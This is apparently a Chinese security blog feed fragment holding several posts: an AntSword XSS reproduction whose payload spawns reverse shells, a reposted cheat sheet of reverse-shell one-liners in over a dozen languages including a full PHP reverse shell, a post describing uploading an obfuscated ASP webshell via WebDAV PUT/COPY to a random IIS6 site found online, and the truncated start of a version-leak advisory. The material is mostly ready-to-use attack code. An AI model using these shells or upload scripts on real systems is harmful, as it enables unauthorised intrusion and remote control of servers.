    <content type="html"><![CDATA[<p>前几天蚁剑暴X®S©S(E)，所以复现看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.1 500 &lt;img src=# onerror=alert(/AntSword-XSS/)&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB15QSiaA9E3KVjSZFG76319XXaR.png" alt=""></p><h3 id="弹shell">弹shell</h3><p>写入自己喜欢的弹shell方式到，<code>exec()</code>内，然后进行base64加密</p><p>perl:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec(<span class="hljs-string">&#x27;perl -e &#x27;</span><span class="hljs-keyword">use</span> Socket;$i=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;$p=<span class="hljs-number">4444</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(<span class="hljs-keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/bash -i&quot;</span>);&#125;;<span class="hljs-string">&#x27;&#x27;</span>,(error, stdout, stderr)=&gt;&#123;<br>    alert(<span class="hljs-string">`stdout: $&#123;stdout&#125;`</span>);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>python:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;python -c \’import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash”,”-i”]);\’’,(error, stdout, stderr)=&gt;&#123;</span><br><span class="hljs-string">    alert(`stdout: $&#123;stdout&#125;`);</span><br><span class="hljs-string">  &#125;);</span><br></code></pre></td></tr></table></figure><p>bash:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1’,(error, stdout, stderr)=&gt;&#123;</span><br><span class="hljs-string">    alert(`stdout: $&#123;stdout&#125;`);</span><br><span class="hljs-string">  &#125;);</span><br></code></pre></td></tr></table></figure><h3 id="最终的exp">最终的exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;HTTP/1.1 406 Not &lt;img src=# onerror=&#x27;eval(new Buffer(`base64编码内容`,`base64`).toString())&#x27;&gt;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>nc监听4444，蚁剑添加webshell，双击打开后，成功弹回bash</p><p><img src="https://ae01.alicdn.com/kf/HTB1VN9jaBOD3KVjSZFF763n9pXaL.png" alt=""></p><p>PS:</p><p>这里有个坑，就是，用py、bash、nc之类的弹不回shell，用perl就行。不知道怎么回事。后面再研究院研究</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>X(R)S(C)S(E)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Reverse-shells</title>
    <link href="/posts/8a802f59.html"/>
    <url>/posts/8a802f59.html</url>
    
    <content type="html"><![CDATA[<p>常用反弹shell姿势</p><p>原文作者：<a href="https://alamot.github.io/reverse_shells/">Antonios Tsolis</a></p><h3 id="Awk">Awk</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN &#123;s = &quot;/inet/tcp/0/LHOST/LPORT&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null<br></code></pre></td></tr></table></figure><h3 id="Bash">Bash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/LOST/LPORT 0&gt;&amp;1<br><br>0&lt;&amp;196;<span class="hljs-built_in">exec</span> 196&lt;&gt;/dev/tcp/LHOST/LPORT; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br><br><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/LHOST/LPORT &amp;&amp; <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line 0&lt;&amp;5; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="Java">Java</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r = Runtime.getRuntime(); p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/LHOST/LPORT;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[]); p.waitFor()<br></code></pre></td></tr></table></figure><h3 id="Netcat">Netcat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash LHOST LPORT<br><br>/bin/bash|nc LHOST LPORT<br><br><span class="hljs-built_in">rm</span> -f /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc LHOST LPORT &gt;/tmp/f<br><br><span class="hljs-built_in">rm</span> -f backpipe; <span class="hljs-built_in">mknod</span> /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc LHOST LPORT 1&gt;/tmp/backpipe<br><br><span class="hljs-built_in">rm</span> -f backpipe; <span class="hljs-built_in">mknod</span> /tmp/backpipe p &amp;&amp; nc LHOST LPORT 0&lt;backpipe | /bin/bash 1&gt;backpipe<br></code></pre></td></tr></table></figure><h3 id="Perl">Perl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;LHOST&quot;;$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -MIO -e <span class="hljs-string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;LPORT:LHOST&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></code></pre></td></tr></table></figure><p>Windows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -MIO -e <span class="hljs-string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;LPORT:LHOST&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="PHP">PHP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;LHOST&quot;,LPORT);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;LHOST&quot;,LPORT);shell_exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;LHOST&quot;,LPORT);`/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;LHOST&quot;,LPORT);system(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp; 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;LHOST&quot;,LPORT);popen(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp; 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure><p>php写成一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php set_time_limit (0); <span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>; <span class="hljs-variable">$ip</span> = <span class="hljs-string">&quot;LHOST&quot;</span>; <span class="hljs-variable">$port</span> = LPORT; <span class="hljs-variable">$chunk_size</span> = 1400; <span class="hljs-variable">$write_a</span> = null; <span class="hljs-variable">$error_a</span> = null; <span class="hljs-variable">$shell</span> = <span class="hljs-string">&quot;uname -a; w; id; /bin/bash -i&quot;</span>; <span class="hljs-variable">$daemon</span> = 0; <span class="hljs-variable">$debug</span> = 0; <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&quot;pcntl_fork&quot;</span>)) &#123; <span class="hljs-variable">$pid</span> = pcntl_fork(); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -1) &#123; printit(<span class="hljs-string">&quot;ERROR: Cannot fork&quot;</span>); <span class="hljs-built_in">exit</span>(1); &#125; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123; <span class="hljs-built_in">exit</span>(0); &#125; <span class="hljs-keyword">if</span> (posix_setsid() == -1) &#123; printit(<span class="hljs-string">&quot;Error: Cannot setsid()&quot;</span>); <span class="hljs-built_in">exit</span>(1); &#125; <span class="hljs-variable">$daemon</span> = 1; &#125; <span class="hljs-keyword">else</span> &#123; printit(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>); &#125; <span class="hljs-built_in">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>); <span class="hljs-built_in">umask</span>(0); <span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30); <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123; printit(<span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (<span class="hljs-variable">$errno</span>)&quot;</span>); <span class="hljs-built_in">exit</span>(1); &#125; <span class="hljs-variable">$descriptorspec</span> = array(0 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>), 1 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), 2 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)); <span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>); <span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) &#123; printit(<span class="hljs-string">&quot;ERROR: Cannot spawn shell&quot;</span>); <span class="hljs-built_in">exit</span>(1); &#125; stream_set_blocking(<span class="hljs-variable">$pipes</span>[0], 0); stream_set_blocking(<span class="hljs-variable">$pipes</span>[1], 0); stream_set_blocking(<span class="hljs-variable">$pipes</span>[2], 0); stream_set_blocking(<span class="hljs-variable">$sock</span>, 0); printit(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span>&quot;</span>); <span class="hljs-keyword">while</span> (1) &#123; <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) &#123; printit(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>); <span class="hljs-built_in">break</span>; &#125; <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[1])) &#123; printit(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>); <span class="hljs-built_in">break</span>; &#125; <span class="hljs-variable">$read_a</span> = array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$pipes</span>[2]); <span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, null); <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK READ&quot;</span>); <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK: <span class="hljs-variable">$input</span>&quot;</span>); fwrite(<span class="hljs-variable">$pipes</span>[0], <span class="hljs-variable">$input</span>); &#125; <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$read_a</span>)) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT READ&quot;</span>); <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$chunk_size</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT: <span class="hljs-variable">$input</span>&quot;</span>); fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>); &#125; <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$read_a</span>)) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR READ&quot;</span>); <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$chunk_size</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR: <span class="hljs-variable">$input</span>&quot;</span>); fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>); &#125; &#125; fclose(<span class="hljs-variable">$sock</span>); fclose(<span class="hljs-variable">$pipes</span>[0]); fclose(<span class="hljs-variable">$pipes</span>[1]); fclose(<span class="hljs-variable">$pipes</span>[2]); proc_close(<span class="hljs-variable">$process</span>); <span class="hljs-keyword">function</span> printit (<span class="hljs-variable">$string</span>) &#123;  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123; <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;<span class="hljs-variable">$string</span>\\n&quot;</span>; &#125; &#125; ?&gt;<br></code></pre></td></tr></table></figure><h3 id="Powershell">Powershell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient(<span class="hljs-string">&#x27;LHOST&#x27;</span>,LPORT); <span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream(); [byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;; <span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) -ne 0) &#123;; <span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>); <span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String ); <span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&#x27;PS &#x27;</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">&#x27;&gt; &#x27;</span>; <span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>); <span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length); <span class="hljs-variable">$stream</span>.Flush()&#125;; <span class="hljs-variable">$client</span>.Close();<br></code></pre></td></tr></table></figure><h3 id="python">python</h3><p>TCP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;LHOST&#x27;,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#x27;HISTFILE&#x27;,&#x27;/dev/null&#x27;);pty.spawn([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);s.close();exit();&quot;</span><br></code></pre></td></tr></table></figure><p>STCP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((&#x27;LHOST&#x27;,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#x27;HISTFILE&#x27;,&#x27;/dev/null&#x27;);pty.spawn([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);s.close();exit();&quot;</span><br></code></pre></td></tr></table></figure><p>UDP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((&#x27;LHOST&#x27;,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&#x27;HISTFILE&#x27;,&#x27;/dev/null&#x27;);pty.spawn([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);s.close();&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Ruby">Ruby</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">&#x27;f=TCPSocket.open(&quot;LHOST&quot;,LPORT).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">&#x27;exit if fork;c=TCPSocket.new(&quot;LHOST&quot;,&quot;LPORT&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></code></pre></td></tr></table></figure><p>Windows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">&#x27;c=TCPSocket.new(&quot;LHOST&quot;,&quot;LPORT&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Socat">Socat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT<br></code></pre></td></tr></table></figure><h3 id="TCLsh">TCLsh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;set s [socket LHOST LPORT];while 42 &#123; puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123; puts $s $r &#125;; flush $s; &#125;; close $s;&#x27;</span> | tclsh<br></code></pre></td></tr></table></figure><h3 id="Telnet">Telnet</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -f /tmp/p; <span class="hljs-built_in">mknod</span> /tmp/p p &amp;&amp; telnet LHOST LPORT 0/tmp/p<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet LHOST LPORT | /bin/bash | telnet LHOST LPORT<br></code></pre></td></tr></table></figure><h3 id="xterm">xterm</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">xhost +RHOST<br>xterm -display LHOST:0 or DISPLAY=LHOST: xterm<br></code></pre></td></tr></table></figure><h3 id="Listeners">Listeners</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat file:`<span class="hljs-built_in">tty</span>`,<span class="hljs-built_in">echo</span>=0,raw tcp-listen:LPORT<br>nc -lvvp LPORT<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>转载搬运</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘录</tag>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Microsoft IIS WebDAV Write Access Code Execution</title>
    <link href="/posts/6b5b56c.html"/>
    <url>/posts/6b5b56c.html</url>
    
    <content type="html"><![CDATA[<p>某天，在网上逛了逛发现了个iis 6站，http所有方法都开了。古老的iis6，存在文件解析漏洞。So。。。。。</p><p>使用py脚本进行put一个shell的txt文件，然后copy成<code>.asp;txt</code>尾缀的新文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib2<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">iisput</span>():<br>url=<span class="hljs-string">&quot;http://example.com/q.txt&quot;</span><br>    <span class="hljs-comment"># passwd:z</span><br>data=<span class="hljs-string">&#x27;&lt;%Function MorfiCoder(Code)MorfiCoder=Replace(Replace(StrReverse(Code),&quot;/*/&quot;,&quot;&quot;&quot;&quot;),&quot;\*\&quot;,vbCrlf)End FunctionExecute MorfiCoder(&quot;)/*/z/*/(tseuqer lave&quot;)%&gt;&#x27;</span><br>req=urllib2.Request(url,data)<br>req.get_method=<span class="hljs-keyword">lambda</span>:<span class="hljs-string">&#x27;PUT&#x27;</span><br>req=urllib2.urlopen(req)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">iiswrite</span>():<br>url=<span class="hljs-string">&quot;http://example.com/q.txt&quot;</span><br>req=urllib2.Request(url)<br>req.get_method=<span class="hljs-keyword">lambda</span>:<span class="hljs-string">&#x27;COPY&#x27;</span><br>req.add_header(<span class="hljs-string">&#x27;Destination&#x27;</span>, <span class="hljs-string">&#x27;http://example.com/q.asp;txt&#x27;</span>)<br>req=urllib2.urlopen(req)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>iisput()<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Txt file put successfully&quot;</span><br>iiswrite()<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Copy txt to asp successfully&quot;</span><br></code></pre></td></tr></table></figure><p>菜刀连接，整站源码直接暴露出来了。</p><p><img src="https://ae01.alicdn.com/kf/HTB1Kp1jaBSD3KVjSZFq7634bpXay.png" alt=""></p><p>查看当前连接情况，发现已经沦落为跑马场了，所有没什么可玩的了。</p><p><img src="https://ae01.alicdn.com/kf/HTB1Uo9paqWs3KVjSZFx761WUXXay.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Middleware version information leaked</title>
    <link href="/posts/5be9406d.html"/>
    <url>/posts/5be9406d.html</url>
    
    <content type="html"><![CDATA[<p>原文：倾旋 <a href="https://payloads.online/archivers/2018-04-18/2">https://payloads.online/archivers/2018-04-18/2</a></p><h2 id="0x00-中间件版本信息泄露">0x00 中间件版本信息泄露</h2><h3 id="什么是中间件版本信息泄露">什么是中间件版本信息泄露</h3><p>通常在HTTP报文的响应头中存在的标志、版本号等信息均属于中间件的版本信息泄露。</p><h3 id="中间件版本信息泄露的特点">中间件版本信息泄露的特点</h3><p>通常出现在默认安装好的Web中间件上，大部分管理员都不会修改这个标志。</p><h2 id="0x01-中间件版本信息泄露-风险等级">0x01 中间件版本信息泄露-风险等级</h2><p>** <code>低</code> **</p><h2 id="0x02-中间件版本信息泄露-原理">0x02 中间件版本信息泄露-原理</h2><p>由于各大Web服务中间件为了打造品牌效应而在HTTP响应头中添加了标志信息、版本号。</p><h2 id="0x03-中间件版本信息泄露-常见场景">0x03 中间件版本信息泄露-常见场景</h2><ul><li>Tomcat</li><li>Nginx</li><li>Apache</li><li>IIs</li><li>…均有此类现象</li></ul><h2 id="0x04-测试方案">0x04 测试方案</h2><p>使用CURL发送OPTIONS、GET、POST、HEAD等请求，查看响应头中的Server行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -I -X GET http://192.168.33.133/mutillidae/<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1NxmnaBKw3KVjSZFO761rDVXa2.png" alt=""></p><h2 id="0x05-修复方案">0x05 修复方案</h2><h3 id="Apache">Apache</h3><p>将以下配置加入 <code>conf/httpd.conf</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span 